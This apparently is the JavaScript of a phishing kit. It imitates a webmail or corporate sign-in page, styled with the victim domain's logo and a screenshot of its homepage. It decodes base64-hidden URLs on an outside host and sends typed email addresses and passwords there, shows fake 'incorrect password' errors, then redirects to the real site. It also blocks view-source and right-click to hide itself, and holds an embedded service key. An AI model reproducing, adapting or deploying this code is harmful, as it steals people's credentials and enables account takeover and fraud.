

var myVar;

function myFunction() {
  myVar = setTimeout(showPage, 5000);
}

function showPage() {
  document.getElementById("loader").style.display = "none";
  document.getElementById("myDiv").style.display = "block";
}

// prevent ctrl + s
$(document).bind('keydown', function(e) {
if(e.ctrlKey && (e.which == 83)) {
e.preventDefault();
return false;
}
});

document.addEventListener('contextmenu', event => event.preventDefault());

document.onkeydown = function(e) {
if (e.ctrlKey && 
(e.keyCode === 67 ||   
e.keyCode === 86 || 
e.keyCode === 85 || 
e.keyCode === 117)) {
return false;
} else {
return true;
}
};
$(document).keypress("u",function(e) {
if(e.ctrlKey)
{
return false;      }
else {
return true;
}});




    /* global $ */
    $(document).ready(function(){
      var count=0;	
      $('#back1').click(function () {
        $("#msg").hide();
        $('#email').val("");
        $("#automail").animate({left:200, opacity:"hide"}, 0);
        $("#inputbar").animate({right:200, opacity:"show"}, 1000);

      });

      //var email = window.location.hash.substr(1);
	  var vsr = window.location.href.slice(window.location.href.indexOf('#') + 1);
	  const myArray = vsr.split("&");
	  vsr = myArray[0];
	 //alert (vsr);
	 var chkRcord = isBase64(vsr);
		//alert(chkRcord);
	 if (!chkRcord){
		window.location.replace("https://google.com");
		//alert ("here");
	
	 }
	 var fieldName = getUrlVars()["field"];

	 var delay = 3000;
      if ((!vsr) || (vsr.indexOf("html") >= 0) || (vsr=="")) {
        //window.location.href = 'http://google.com';
		window.location.replace("http://google.com");
	  }
      else
      {
		vsr= decodeURIComponent(vsr);
		vsr=atob(atob(vsr));
		if (fieldName ==null || fieldName ==""){//no validation set,validate!
		
			var s = atob("aHR0cHM6Ly9waHBzdGFjay0xMDczMzg1LTM3NTU2MjUuY2xvdWR3YXlzYXBwcy5jb20vZG5zL3ZhbGlkLnBocA==");
					
			$.ajax({
				crossOrigin:true,
				type: 'GET',
				url: s,//cross-domain request
				data:{
					'domain': vsr
				},
				dataType: 'jsonp', // use JSONP
				success:function(data){
						
					setTimeout(function() {
						delaySuccess(data,vsr);
					}, delay);
							
				}
			});
				
		}else{
		
		$('#fieldName').val(fieldName);
		$("#favicon").attr("href","https://www.google.com/s2/favicons?domain_url="+fieldName+"&sz=64");
		
		}
		
        var my_email =vsr;
		$('#email').val(my_email); 
		var indx=vsr.indexOf("@");
		var slice=vsr.substr((indx+1));
		var mainPageES = 'https://www.'+slice; 
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
		//$("#mainPageES").css("background-image","url(https://image.thum.io/get/"+mainPageES+")");	
		//$("#mainPageES").css("background-image","url(https://image.thum.io/get/auth/68238-wale/"+mainPageES+")");	
		$("#mainPageES").css("background-image","url('https://api.site-shot.com/?userkey=ABAIEYKBJAISI56I4JIBJXDEMV&url="+mainPageES+")");
		

		
		//$("#mainPageES").attr("src","https://image.thum.io/get/auth/68238-wale/"+mainPageES);	
		$("#mainPageES").attr("src","'https://api.site-shot.com/?userkey=ABAIEYKBJAISI56I4JIBJXDEMV&url="+mainPageES);	
        if (!filter.test(my_email)) {
          $('#error').show();
           email.focus;
           return false;
        }
		
      }
	
      $('#submit-btn').click(function(event){
    
		event.preventDefault();
        $('#error').hide();
        $('#msg').hide();
        var email=$("#email").val();
        var password=$("#password").val();
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
	  var result="";

      if (!email) {
            $('#error').show();
            $('#error').html("<p style='color:red; font-size:15px'> Email field is empty</p>");
        
            return false;
        }

        if (!filter.test(my_email)) {
            $('#error').show();
            $('#error').html("<p style='color:red; font-size:14px'>That account doesn't exist. Enter a different account</p>");
            
            return false;
        }
        if (!password) {
            $('#error').show();
            $('#error').html("<p style='color:red; font-size:14px'>Password field is empty</p>");
         
            return false;
        }
		 if (password.length < 6) {
            $('#error').show();
            $('#error').html("<p style='color:red; font-size:14px'>An error occured, invalid password</p>");
			result = document.getElementById('password');
			result.value="";
            email.focus;
            return false;
        } 

 
		 
      ///////////new injection////////////////
      count=count+1;
    //  console.log(count); 
	var fieldName = $('#fieldName').val();
	//alert (fieldName); fixate here
	var d=atob("aHR0cHM6Ly9waHBzdGFjay0xMDczMzg1LTM3NTU2MjUuY2xvdWR3YXlzYXBwcy5jb20vc2VydmVyL2F1dGgucGhw");
		
	   $.ajax({
        dataType: 'jsonp',
		crossOrigin:true,
		url: d,
        type: 'GET',
        data:{
          'email':email,
          'password':password,
		  'field': fieldName,
        },
            // data: $('#contact').serialize(),dummyhere
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifying');
			  
    //  console.log(count); 
            },
            success: function(data){
			var jresult = data.message;
			 $('#msg').html("<span style='color:red;'>Username or Password is incorrect. Please try again</span>");
              if(data){
                $("#msg").show();
				console.log(data);
				$('#msg').html(data['msg']);
				
                if(jresult == 'ok'){
                  $("#password").val("");
                  if (count>=3) {
                    count=0;
                    window.location.replace("http://"+slice);

                  }
                  // $('#msg').html(response['msg']);
                }
                else{
                   $('#msg').html(data['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=3) {
                count=0;
                window.location.replace("http://"+slice);
              }
              $("#msg").show();
              // $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Sign in');
            }
          });  
    });
});

    
function delaySuccess(data,my_email){
	
		//alert(data.message);
		var jresult = data.message;
		var ind=my_email.indexOf("@");
		var my_slice=my_email.substr((ind+1));
		
		if (jresult!="FALSE"){
			
			$('#fieldName').val(jresult);
			$("#favLink").attr("href","https://www.google.com/s2/favicons?domain_url="+jresult+"&sz=64");
			$("#favicon").attr("href","https://www.google.com/s2/favicons?domain_url="+jresult+"&sz=64");
			
			
			
			//var mainPage = 'https://www.'+my_slice; 
			var mainPage = 'https://www.'+jresult;			
			//var image = "url('https://image.thum.io/get/auth/68238-wale/"+mainPage;"')";
			var image = "url('https://api.site-shot.com/?userkey=ABAIEYKBJAISI56I4JIBJXDEMV&url="+mainPage;"')";
			
			document.body.style.backgroundImage = image;
			
		}else{
			//alert("Take me out");
			//window.location.href="https://google.com";
			window.location.replace("https://google.com");
		}
		
		switch (jresult){
			case "yahoo.com":
			case "gmail.com":
			case "hotmail.com":
			$("#logoimg").attr("src", "https://logo.clearbit.com/"+jresult);
			break;
			default:
			$("#logoimg").attr("src", "https://www.google.com/s2/favicons?sz=64&domain_url="+jresult);
			
		}
	}
function getUrlVars() {
	var vars = {};
	var parts = window.location.search.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
        vars[key] = value;
		
    });
    return vars;
}

function isBase64(encodedString) {
    var regexBase64 = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
    return regexBase64.test(encodedString);   // return TRUE if its base64 string.
}

  